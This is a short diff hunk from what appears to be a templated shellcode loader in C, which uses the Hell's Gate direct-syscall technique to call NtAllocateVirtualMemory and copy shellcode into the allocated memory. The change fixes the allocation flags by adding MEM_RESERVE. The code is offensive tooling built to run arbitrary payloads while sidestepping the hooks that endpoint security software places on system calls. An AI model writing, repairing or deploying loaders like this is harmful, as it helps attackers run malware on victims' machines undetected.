@@ -561,7 +561,7 @@ BOOL Payload(PVX_TABLE pVxTable) {{
 	PVOID lpAddress = NULL;
 	SIZE_T sDataSize = {shellcodeSize};
 	HellsGate(pVxTable->NtAllocateVirtualMemory.wSystemCall);
-	status = HellDescent((HANDLE)-1, &lpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);
+	status = HellDescent((HANDLE)-1, &lpAddress, 0, &sDataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
 	// Write Memory
 	VxMoveMemory(lpAddress, shellcode, sDataSize);
